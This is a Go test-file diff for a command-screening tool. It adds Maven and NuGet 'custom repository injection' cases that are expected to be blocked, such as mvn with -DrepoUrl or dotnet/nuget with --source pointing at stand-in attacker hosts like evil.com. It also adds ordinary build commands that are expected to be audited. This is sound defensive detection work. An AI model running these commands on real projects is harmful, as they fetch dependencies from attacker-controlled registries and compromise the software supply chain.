@@ -851,6 +851,134 @@ var LockfileOverwriteCases = []TestCase{
 	},
 }
 
+// ---------------------------------------------------------------------------
+// Category 7.9: Maven and NuGet Custom Repository Injection (closes #168)
+// Taxonomy: supply-chain/dependency-confusion/non-standard-registry
+//
+// Maven (-DrepoUrl=) and NuGet/dotnet (--source) support custom repository
+// URLs that bypass official registries, enabling dependency confusion attacks.
+// ---------------------------------------------------------------------------
+
+// MavenNuGetRegistryCases tests detection of Maven and NuGet custom repository injection.
+var MavenNuGetRegistryCases = []TestCase{
+
+	// --- TRUE POSITIVES ---
+
+	{
+		ID:               "TP-SC-MAVEN-REPO-001",
+		Command:          `mvn dependency:get -Dartifact=com.example:lib:1.0 -DrepoUrl=https://evil.com/maven2`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "mvn dependency:get with -DrepoUrl= pointing to attacker-controlled Maven repo. Dependency confusion attack.",
+		Tags:             []string{"tp", "maven", "critical"},
+	},
+	{
+		ID:               "TP-SC-MAVEN-REPO-002",
+		Command:          `mvnw install -DrepoUrl=http://internal-mirror.attacker.net/maven`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "Maven wrapper (mvnw) install with -DrepoUrl= override. Same attack using wrapper script.",
+		Tags:             []string{"tp", "maven"},
+	},
+	{
+		ID:               "TP-SC-MAVEN-LOCAL-001",
+		Command:          `mvn install -Dmaven.repo.local=/tmp/evil-cache`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "mvn install overrides local Maven cache to /tmp, allowing pre-staged malicious artifacts to be resolved.",
+		Tags:             []string{"tp", "maven"},
+	},
+	{
+		ID:               "TP-SC-DOTNET-SOURCE-001",
+		Command:          `dotnet add package Newtonsoft.Json --source https://evil.com/nuget/v3/index.json`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "dotnet add package with --source pointing to attacker-controlled NuGet feed. Dependency confusion attack.",
+		Tags:             []string{"tp", "dotnet", "nuget", "critical"},
+	},
+	{
+		ID:               "TP-SC-DOTNET-SOURCE-002",
+		Command:          `dotnet add package MyCompany.Internal --source http://packages.evil.internal/nuget`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "dotnet add package with http custom source — also covers non-HTTPS sources that allow MITM.",
+		Tags:             []string{"tp", "dotnet", "nuget"},
+	},
+	{
+		ID:               "TP-SC-NUGET-SOURCE-001",
+		Command:          `nuget install Serilog -Source https://evil.com/nuget`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "nuget install with -Source pointing to attacker NuGet feed. Dependency confusion via NuGet CLI.",
+		Tags:             []string{"tp", "nuget", "critical"},
+	},
+	{
+		ID:               "TP-SC-NUGET-SOURCE-002",
+		Command:          `nuget restore -Source https://packages.attacker.io/v3`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "nuget restore with custom -Source URL. Redirects all package resolution to attacker server.",
+		Tags:             []string{"tp", "nuget"},
+	},
+
+	// --- TRUE NEGATIVES ---
+
+	{
+		ID:               "TN-SC-MAVEN-001",
+		Command:          `mvn compile`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/dependency-confusion/package-install",
+		Analyzer:         "regex",
+		Description:      "Standard mvn compile with no registry override. Should AUDIT (sc-audit-mvn-build), not BLOCK.",
+		Tags:             []string{"tn", "maven"},
+	},
+	{
+		ID:               "TN-SC-MAVEN-002",
+		Command:          `mvn test`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "mvn test runs existing compiled tests — no custom registry. No BLOCK rule fires; default policy AUDIT.",
+		Tags:             []string{"tn", "maven", "safe"},
+	},
+	{
+		ID:               "TN-SC-DOTNET-001",
+		Command:          `dotnet add package Newtonsoft.Json`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/dependency-confusion/package-install",
+		Analyzer:         "regex",
+		Description:      "Standard dotnet add package from official NuGet gallery (no --source). Should AUDIT, not BLOCK.",
+		Tags:             []string{"tn", "dotnet"},
+	},
+	{
+		ID:               "TN-SC-DOTNET-002",
+		Command:          `dotnet build`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "dotnet build compiles the project — does not install new packages. No BLOCK rule fires; default policy AUDIT.",
+		Tags:             []string{"tn", "dotnet", "safe"},
+	},
+}
+
 // AllSupplyChainCases returns all test cases for Kingdom 7.
 func AllSupplyChainCases() []TestCase {
 	var all []TestCase
@@ -862,5 +990,6 @@ func AllSupplyChainCases() []TestCase {
 	all = append(all, PipIndexURLCases...)
 	all = append(all, CondaChannelCases...)
 	all = append(all, LockfileOverwriteCases...)
+	all = append(all, MavenNuGetRegistryCases...)
 	return all
 }
